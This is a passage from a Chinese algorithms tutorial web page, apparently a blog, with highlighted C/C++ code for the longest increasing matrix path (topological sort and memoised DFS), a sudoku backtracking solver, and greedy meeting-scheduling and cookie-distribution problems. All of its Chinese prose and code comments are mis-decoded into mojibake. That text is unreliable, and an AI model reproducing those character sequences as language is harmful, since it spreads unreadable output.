class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>                <span class="hljs-type">int</span> ni = i + dx[k];<br>                <span class="hljs-type">int</span> nj = j + dy[k];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">valid</span>(ni, nj) &amp;&amp; matrix[ni][nj] &gt; matrix[i][j]) &#123;<br>                    <span class="hljs-built_in">addEdge</span>(<span class="hljs-built_in">num</span>(i, j), <span class="hljs-built_in">num</span>(ni, nj));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// è¿›è¡Œæ‹“æ‰‘æ’åº</span><br>    queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m * n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (deg[i] == <span class="hljs-number">0</span>) &#123;<br>            q.<span class="hljs-built_in">push</span>(i);<br>            dist[i] = <span class="hljs-number">1</span>;  <span class="hljs-comment">// åˆå§‹ç‚¹çš„è·¯å¾„é•¿åº¦æ˜¯1</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// æ‹“æ‰‘æ’åºï¼Œæ›´æ–°æ¯ä¸ªèŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„</span><br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>            deg[y]--;<br>            dist[y] = <span class="hljs-built_in">max</span>(dist[y], dist[x] + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (deg[y] == <span class="hljs-number">0</span>) q.<span class="hljs-built_in">push</span>(y);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// æ‰¾å‡ºæœ€é•¿è·¯å¾„</span><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m * n; i++) &#123;<br>        ans = <span class="hljs-built_in">max</span>(ans, dist[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; m &gt;&gt; n;<br>    <span class="hljs-comment">// è¾“å…¥çŸ©é˜µæ•°æ®</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            cin &gt;&gt; matrix[i][j];<br>        &#125;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-built_in">longestIncreasingPath</span>() &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±çŸ¥é“äº†ï¼Œåœ¨ä¸€å¼ æœ‰æ•ˆæ— ç¯å›¾ä¸Šï¼Œä¸ç®¡æ˜¯çƒæœ€é•¿å•Šã€‚ç»Ÿè®¡ä»€ä¹ˆåˆ«çš„ä¿¡æ¯ï¼Œåªè¦è¿™ä¸ªä¿¡æ¯éœ€è¦å¯¹æ‰€æœ‰çš„å“å…¥ç¼–åšç»Ÿè®¡ï¼Œæ¯”å¦‚å–maxï¼Œä¸‹æ±‚å’Œç­‰ç­‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ã€‚å›¾æ’åºæ¥è¿›è¡Œè¿™æ ·ä¸€ä¸ªä¿¡æ¯ç»Ÿè®¡ã€‚</p><p>å¦ä¸€ç§æ–¹æ³•ï¼šdfsè®°å¿†åŒ–</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> m, n;<br><span class="hljs-type">int</span> matrix[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<br><span class="hljs-type">int</span> dist[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>]; <span class="hljs-comment">// ç”¨äºè®°å½•æœ€é•¿è·¯å¾„çš„é•¿åº¦</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">valid</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> i &gt;= <span class="hljs-number">0</span> &amp;&amp; i &lt; m &amp;&amp; j &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dist[x][y] != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> dist[x][y]; <span class="hljs-comment">// å¦‚æœå·²ç»è®¡ç®—è¿‡ï¼Œåˆ™è¿”å›</span><br>    dist[x][y] = <span class="hljs-number">1</span>; <span class="hljs-comment">// åˆå§‹åŒ–å½“å‰è·¯å¾„é•¿åº¦</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>        <span class="hljs-type">int</span> nx = x + dx[k];<br>        <span class="hljs-type">int</span> ny = y + dy[k];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">valid</span>(nx, ny) &amp;&amp; matrix[nx][ny] &gt; matrix[x][y]) &#123;<br>            dist[x][y] = <span class="hljs-built_in">max</span>(dist[x][y], <span class="hljs-built_in">dfs</span>(nx, ny) + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dist[x][y];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestIncreasingPath</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// éå†æ¯ä¸ªä½ç½®ï¼Œè¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œæ‰¾å‡ºæœ€é•¿é€’å¢è·¯å¾„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            ans = <span class="hljs-built_in">max</span>(ans, <span class="hljs-built_in">dfs</span>(i, j));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; m &gt;&gt; n; <span class="hljs-comment">// è¾“å…¥è¡Œå’Œåˆ—æ•°</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            cin &gt;&gt; matrix[i][j]; <span class="hljs-comment">// è¾“å…¥çŸ©é˜µå…ƒç´ </span><br>        &#125;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-built_in">longestIncreasingPath</span>() &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æ•°ç‹¬é—®é¢˜"><a href="#æ•°ç‹¬é—®é¢˜" class="headerlink" title="æ•°ç‹¬é—®é¢˜"></a>æ•°ç‹¬é—®é¢˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*s[11][11]ï¼šè¿™æ˜¯ä¸€ä¸ªäºŒç»´å­—ç¬¦æ•°ç»„ï¼Œç”¨æ¥è¡¨ç¤ºæ•°ç‹¬çš„ 9x9 ç½‘æ ¼ã€‚æ¯ä¸ªå…ƒç´ è¡¨ç¤ºä¸€ä¸ªæ ¼å­ï¼Œå€¼ä¸º . è¡¨ç¤ºç©ºæ ¼ï¼Œ1 åˆ° 9 ä»£è¡¨å·²ç»å¡«å…¥çš„æ•°å­—ã€‚</span><br><span class="hljs-comment">h[11][11]ï¼šç”¨äºè®°å½•æ¯ä¸€è¡Œä¸­æ•°å­—æ˜¯å¦å·²ç»è¢«ä½¿ç”¨ã€‚h[x][i] ä¸º 1 è¡¨ç¤ºæ•°å­— i å·²ç»åœ¨ç¬¬ x è¡Œä½¿ç”¨ã€‚</span><br><span class="hljs-comment">l[11][11]ï¼šç”¨äºè®°å½•æ¯ä¸€åˆ—ä¸­æ•°å­—æ˜¯å¦å·²ç»è¢«ä½¿ç”¨ã€‚l[y][i] ä¸º 1 è¡¨ç¤ºæ•°å­— i å·²ç»åœ¨ç¬¬ y åˆ—ä½¿ç”¨ã€‚</span><br><span class="hljs-comment">g[5][5][11]ï¼šç”¨äºè®°å½•æ¯ä¸ª 3x3 å®«æ ¼ä¸­æ•°å­—æ˜¯å¦å·²ç»è¢«ä½¿ç”¨ã€‚g[x/3][y/3][i] ä¸º 1 è¡¨ç¤ºæ•°å­— i å·²ç»åœ¨ (x, y) ä½ç½®å¯¹åº”çš„ 3x3 å®«æ ¼ä¸­ä½¿ç”¨ã€‚ */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">char</span> s[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>];<br><span class="hljs-type">int</span> h[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>], l[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>], g[<span class="hljs-number">5</span>][<span class="hljs-number">5</span>][<span class="hljs-number">11</span>];<br><span class="hljs-type">int</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">if</span> (y == <span class="hljs-number">9</span>) x++, y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (x == <span class="hljs-number">9</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) <span class="hljs-built_in">cout</span> &lt;&lt; s[i] &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (s[x][y] != <span class="hljs-string">&#x27;.&#x27;</span>) <span class="hljs-keyword">return</span> dfs(x, y + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (h[x][i] || l[y][i] || g[x / <span class="hljs-number">3</span>][y / <span class="hljs-number">3</span>][i]) <span class="hljs-keyword">continue</span>;<br>        h[x][i] = l[y][i] = g[x / <span class="hljs-number">3</span>][y / <span class="hljs-number">3</span>][i] = <span class="hljs-number">1</span>;<br>        s[x][y] = i + <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (dfs(x, y + <span class="hljs-number">1</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        h[x][i] = l[y][i] = g[x / <span class="hljs-number">3</span>][y / <span class="hljs-number">3</span>][i] = <span class="hljs-number">0</span>;<br>        s[x][y] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; s[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt; <span class="hljs-number">9</span>; j++) &#123;<br>            <span class="hljs-keyword">if</span> (s[i][j] == <span class="hljs-string">&#x27;.&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-type">int</span> x = s[i][j] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            h[i][x] = l[j][x] = g[i / <span class="hljs-number">3</span>][j / <span class="hljs-number">3</span>][x] = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    dfs(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="äºŒè¿›åˆ¶æšä¸¾-å¡«ç©ºé¢˜"><a href="#äºŒè¿›åˆ¶æšä¸¾-å¡«ç©ºé¢˜" class="headerlink" title="äºŒè¿›åˆ¶æšä¸¾(å¡«ç©ºé¢˜)"></a>äºŒè¿›åˆ¶æšä¸¾(å¡«ç©ºé¢˜)</h3><hr><h2 id="åå…«-è´ªå¿ƒ"><a href="#åå…«-è´ªå¿ƒ" class="headerlink" title="åå…«. è´ªå¿ƒ"></a>åå…«. è´ªå¿ƒ</h2><p>1)æœ€è‡ªç„¶æ™ºæ…§çš„ç®—æ³•<br>2)ç”¨ä¸€ç§å±€éƒ¨æœ€åŠŸåˆ©çš„æ ‡å‡†ï¼Œæ€»æ˜¯åšå‡ºåœ¨å½“å‰çœ‹æ¥æ˜¯æœ€å¥½çš„é€‰æ‹©<br>3)éš¾ç‚¹åœ¨äºè¯æ˜å±€éƒ¨æœ€åŠŸåˆ©çš„æ ‡å‡†å¯ä»¥å¾—åˆ°å…¨å±€æœ€ä¼˜è§£<br>4)å¯¹äºè´ªå¿ƒç®—æ³•çš„å­¦ä¹ ä¸»è¦ä»¥å¢åŠ é˜…å†å’Œç»éªŒä¸ºä¸»</p><p>åªè¦ä¸¾å‡ºä¸€ä¸ªé”™è¯¯è§£å°±æ˜¯æ— æ•ˆçš„ï¼Œæˆ‘ä»¬æ¯ä¸ªäººéƒ½ä¼šå¯¹å±€éƒ¨å®šä¹‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„çŠ¶å†µï¼Œç„¶åæˆ‘ä»¬æƒ³ä¸€æ­¥ä¸€æ­¥æŒ‰ç…§æˆ‘ä»¬çš„æƒ³æ³•æ‰§è¡Œï¼Œé‚£ä¹ˆä½ æ¯ä¸€æ­¥å®šçš„é‚£ä¸ªç­–ç•¥ï¼Œå®ƒå°±å±å±äºä½ çš„è´ªå¿ƒç­–ç•¥ã€‚ä»–èƒ½å¤Ÿæ¨å‡ºæœ€ç»ˆçš„æœ€ä¼˜è§£ï¼Œé‚£è´ªå¿ƒç­–ç•¥å°±æ˜¯æœ‰æ•ˆçš„ï¼Œä»–æ˜¯è´ªä¸å‡ºæ¥ä»–é‚£æœ€æœ€ç»ˆç­–ç•¥å°±æ˜¯æ— æ•ˆçš„ï¼Œ</p><p>ä½†æ˜¯è¯æ˜æ˜¯ä¸å¯èƒ½è¯æ˜çš„ï¼Œè¦ç”¨å¯¹æ•°å™¨ï¼Œå†™ä¸€ä¸ªæš´åŠ›è§£æ¯”å¯¹è´ªå¿ƒç­–ç•¥,ä¹Ÿä¸ç”¨å¤ªç ”ç©¶ï¼Œå°±è®°ä½ä»¥ä¸‹ä¾‹é¢˜å°±è¡Œ</p><h3 id="ä¾‹é¢˜-9"><a href="#ä¾‹é¢˜-9" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="ä¼šè®®å®¤"><a href="#ä¼šè®®å®¤" class="headerlink" title="ä¼šè®®å®¤"></a>ä¼šè®®å®¤</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// ä¼šè®®ç»“æ„ä½“</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Program</span> &#123;</span><br>    <span class="hljs-type">int</span> start, end;<br>&#125;;<br><br><span class="hljs-comment">// è‡ªå®šä¹‰æ’åºè§„åˆ™ï¼ŒæŒ‰ç…§ä¼šè®®çš„ç»“æŸæ—¶é—´å‡åºæ’åº</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">cmp</span><span class="hljs-params">(<span class="hljs-type">const</span> Program&amp; a, <span class="hljs-type">const</span> Program&amp; b)</span> &#123;<br>    <span class="hljs-keyword">return</span> a.end &lt; b.end;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">bestArrange2</span><span class="hljs-params">(Program programs[], <span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-comment">// æŒ‰ç…§ç»“æŸæ—¶é—´å‡åºæ’åº</span><br>    sort(programs, programs + n, cmp);<br>    <br>    <span class="hljs-type">int</span> timeLine = <span class="hljs-number">0</span>, result = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// è´ªå¿ƒç­–ç•¥ï¼šé€‰æ‹©ç»“æŸæ—¶é—´æœ€æ—©çš„ä¼šè®®</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (timeLine &lt;= programs[i].start) &#123;<br>            result++;<br>            timeLine = programs[i].end;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;<br>    Program programs[<span class="hljs-number">100</span>]; <span class="hljs-comment">// é¢„è®¾æœ€å¤š100ä¸ªä¼šè®®</span><br>    <span class="hljs-comment">// è¾“å…¥ä¼šè®®æ—¶é—´</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; programs[i].start &gt;&gt; programs[i].end;<br>    &#125;<br>    <span class="hljs-comment">// è¾“å‡ºæœ€å¤šå¯ä»¥å®‰æ’çš„ä¼šè®®æ•°é‡</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; bestArrange2(programs, n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="åˆ†å‘é¥¼å¹²"><a href="#åˆ†å‘é¥¼å¹²" class="headerlink" title="åˆ†å‘é¥¼å¹²"></a>åˆ†å‘é¥¼å¹²</h4><p>å‡è®¾ä½ æ˜¯ä¸€ä½å¾ˆæ…·æ…¨çš„å®¶é•¿ï¼Œæƒ³è¦ç»™å­©å­ä»¬ä¸€äº›å°é¥¼å¹²ã€‚ä½†æ˜¯ï¼Œæ¯ä¸ªå­©å­æœ€å¤šåªèƒ½å¾—åˆ°ä¸€å—é¥¼å¹²ã€‚</p><ul><li>æ¯ä¸ªå­©å­éƒ½æœ‰ä¸€ä¸ªèƒƒå£å€¼ <code>g[i]</code>ï¼Œä»£è¡¨æ»¡è¶³è¿™ä¸ªå­©å­æ‰€éœ€çš„é¥¼å¹²å¤§å°ã€‚</li><li>æ¯å—é¥¼å¹²çš„å¤§å°ç”¨ <code>s[j]</code> è¡¨ç¤ºã€‚</li><li>åªæœ‰å½“é¥¼å¹²çš„å¤§å° <code>s[j] &gt;= g[i]</code> æ—¶ï¼Œè¿™å—é¥¼å¹²æ‰èƒ½æ»¡è¶³å­©å­çš„èƒƒå£ã€‚</li></ul><p><strong>ç¤ºä¾‹ 1</strong>ï¼š</p><ul><li><strong>è¾“å…¥</strong>ï¼š<code>g = [1, 2, 3]</code>, <code>s = [1, 1]</code></li><li><strong>è¾“å‡º</strong>ï¼š<code>1</code></li><li><strong>è§£é‡Š</strong>ï¼šä½ æœ‰ 3 ä¸ªå­©å­ï¼Œèƒƒå£å€¼åˆ†åˆ«æ˜¯ 1ã€2ã€3ï¼Œæœ‰ 2 å—é¥¼å¹²ï¼Œå¤§å°éƒ½æ˜¯ 1ã€‚åªèƒ½æ»¡è¶³èƒƒå£å€¼ä¸º 1 çš„å­©å­ï¼Œæ‰€ä»¥è¾“å‡º 1ã€‚</li></ul><p><strong>ç¤ºä¾‹ 2</strong>ï¼š</p><ul><li><strong>è¾“å…¥</strong>ï¼š<code>g = [1, 2]</code>, <code>s = [1, 2, 3]</code></li><li><strong>è¾“å‡º</strong>ï¼š<code>2</code></li><li><strong>è§£é‡Š</strong>ï¼šä½ æœ‰ 2 ä¸ªå­©å­ï¼Œèƒƒå£å€¼åˆ†åˆ«æ˜¯ 1ã€2ï¼Œæœ‰ 3 å—é¥¼å¹²ï¼Œå¤§å°åˆ†åˆ«æ˜¯ 1ã€2ã€3ã€‚å¯ä»¥æ»¡è¶³æ‰€æœ‰å­©å­çš„éœ€æ±‚ï¼Œæ‰€ä»¥è¾“å‡º 2ã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//è´ªå¿ƒç­–ç•¥æ˜¯å°é¥¼å¹²å…ˆå–‚é¥±å°èƒƒå£</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findContentChildren</span><span class="hljs-params">(<span class="hljs-type">int</span> g[], <span class="hljs-type">int</span> s[], <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">sort</span>(g, g + m); <span class="hljs-comment">// å¯¹å­©å­çš„èƒƒå£å€¼æ’åº</span><br>    <span class="hljs-built_in">sort</span>(s, s + n); <span class="hljs-comment">// å¯¹é¥¼å¹²çš„å¤§å°æ’åº</span><br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; <span class="hljs-comment">// é¥¼å¹²ç´¢å¼•</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &lt; n &amp;&amp; s[j] &lt; g[i]) j++; <span class="hljs-comment">// æ‰¾åˆ°æ»¡è¶³å½“å‰å­©å­èƒƒå£çš„é¥¼å¹²</span><br>        <span class="hljs-keyword">if</span> (j &lt; n) &#123; <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„é¥¼å¹²</span><br>            ans++; <span class="hljs-comment">// æ»¡è¶³ä¸€ä¸ªå­©å­</span><br>            j++; <span class="hljs-comment">// ä½¿ç”¨ä¸€å—é¥¼å¹²</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> m, n;<br>    cin &gt;&gt; m &gt;&gt; n;<br>    <span class="hljs-type">int</span> g[m], s[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) cin &gt;&gt; g[i]; <span class="hljs-comment">// å­©å­çš„èƒƒå£</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) cin &gt;&gt; s[i]; <span class="hljs-comment">// é¥¼å¹²çš„å¤§å°</span><br>    <br>    cout &lt;&lt; <span class="hljs-built_in">findContentChildren</span>(g, s, m, n) 